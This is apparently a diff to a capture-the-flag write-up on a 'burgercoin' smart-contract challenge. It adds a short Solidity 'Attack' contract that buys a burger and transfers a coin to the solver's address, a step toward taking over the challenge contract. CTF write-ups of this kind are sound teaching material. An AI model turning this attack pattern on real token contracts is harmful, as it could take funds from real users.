@@ -388,6 +388,26 @@ After we have 30 burgercoins, we can call `transferBurgerjointOwnership` to tran
 
 Then the challenge is solved.
 
+Solve Contract:
+```js
+contract Attack {
+    burgercoin public target;
+
+    constructor(address _target) {
+        target = burgercoin(_target);
+    }
+
+    function attack(address _me) public {
+        target.purchaseBurger();
+        target.transfer(_me, 1);
+    }
+
+    function isSolved() public view returns (bool) {
+        return target.isSolved();
+    }
+}
+```
+
 # Review
 ---
 
